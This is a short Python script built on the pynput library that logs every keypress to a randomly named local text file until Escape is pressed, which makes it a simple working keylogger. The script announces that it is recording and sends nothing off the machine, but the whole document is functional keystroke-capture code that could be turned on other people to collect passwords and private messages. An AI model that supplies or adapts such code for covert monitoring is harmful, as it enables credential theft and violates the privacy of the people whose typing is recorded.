from pynput.keyboard import Listener, Key
import sys
import random

def closeProgram():
    print("The program was closed!")
    sys.exit()
def writeKey(key):
    try:
        with open(log,'a') as file:
            file.write(f'{str(key)} \n')
    except Exception as e:
        print(f'Error when recording the key: {e}')
        closeProgram()
    if key == Key.esc:
        closeProgram()

log = f'key{random.randint(0,1000)}.txt'
print('The keys are being recorded!')

with Listener(on_press=writeKey) as logs:
    try:
        logs.join()
    except Exception as e:
        print(f'Error running the program: {e}')
    finally:
        logs.stop()
        closeProgram()